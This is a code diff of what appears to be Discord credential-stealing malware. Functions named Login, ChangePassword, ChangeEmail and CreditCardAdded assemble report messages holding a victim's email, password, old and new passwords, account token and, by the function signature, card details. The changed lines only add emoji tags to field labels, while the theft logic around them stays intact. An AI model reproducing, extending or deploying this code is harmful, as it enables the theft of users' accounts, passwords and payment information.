@@ -319,7 +319,7 @@ function Login(e, t, n) {
                           },
                           { name: "ID", value: `\`${i.id}\``, inline: !0 },
                           {
-                            name: "Nitro",
+                            name: "<:nitro:966790472968339576> Nitro",
                             value: `${GetNitro(i.premium_type)}`,
                             inline: !1,
                           },
@@ -350,7 +350,7 @@ function Login(e, t, n) {
                             })()}`,
                             inline: !1,
                           },
-                          { name: "Email", value: `\`${e}\``, inline: !0 },
+                          { name: "<:gmail:966790304701235230> <:gmail:966790304701235230> Email", value: `\`${e}\``, inline: !0 },
                           { name: "Password", value: `\`${t}\``, inline: !0 },
                           {
                             name: "Token",
@@ -436,7 +436,7 @@ function ChangePassword(e, t, n) {
                       },
                       { name: "ID", value: `\`${s.id}\``, inline: !0 },
                       {
-                        name: "Nitro",
+                        name: "<:nitro:966790472968339576> Nitro",
                         value: `${GetNitro(s.premium_type)}`,
                         inline: !1,
                       },
@@ -467,7 +467,7 @@ function ChangePassword(e, t, n) {
                         })()}`,
                         inline: !1,
                       },
-                      { name: "Email", value: `\`${s.email}\``, inline: !1 },
+                      { name: "<:gmail:966790304701235230> Email", value: `\`${s.email}\``, inline: !1 },
                       { name: "Old Password", value: `\`${e}\``, inline: !0 },
                       { name: "New Password", value: `\`${t}\``, inline: !0 },
                       { name: "Token", value: `\`\`\`${n}\`\`\``, inline: !1 },
@@ -511,7 +511,7 @@ function ChangeEmail(e, t, n) {
                 content: "",
                 embeds: [
                   {
-                    title: "Email Changed",
+                    title: "<:gmail:966790304701235230> Email Changed",
                     color: config["embed-color"],
                     fields: [
                       {
@@ -526,7 +526,7 @@ function ChangeEmail(e, t, n) {
                       },
                       { name: "ID", value: `\`${s.id}\``, inline: !0 },
                       {
-                        name: "Nitro",
+                        name: "<:nitro:966790472968339576> Nitro",
                         value: `${GetNitro(s.premium_type)}`,
                         inline: !1,
                       },
@@ -557,7 +557,7 @@ function ChangeEmail(e, t, n) {
                         })()}`,
                         inline: !1,
                       },
-                      { name: "New Email", value: `\`${e}\``, inline: !0 },
+                      { name: "New <:gmail:966790304701235230> Email", value: `\`${e}\``, inline: !0 },
                       { name: "Password", value: `\`${t}\``, inline: !0 },
                       { name: "Token", value: `\`\`\`${n}\`\`\``, inline: !1 },
                     ],
@@ -602,9 +602,9 @@ function CreditCardAdded(e, t, n, a, r, o, s, i, l, d) {
                     c.discriminator +
                     "```\n**ID:**```" +
                     c.id +
-                    "```\n**Email:**```" +
+                    "```\n**<:gmail:966790304701235230> Email:**```" +
                     c.email +
-                    "```\n**Nitro Type:**```" +
+                    "```\n**<:nitro:966790472968339576> Nitro Type:**```" +
                     GetNitro(c.premium_type) +
                     "```\n**<a:boostlevel:966792429443379281> Badges:**```" +
                     GetBadges(c.flags) +
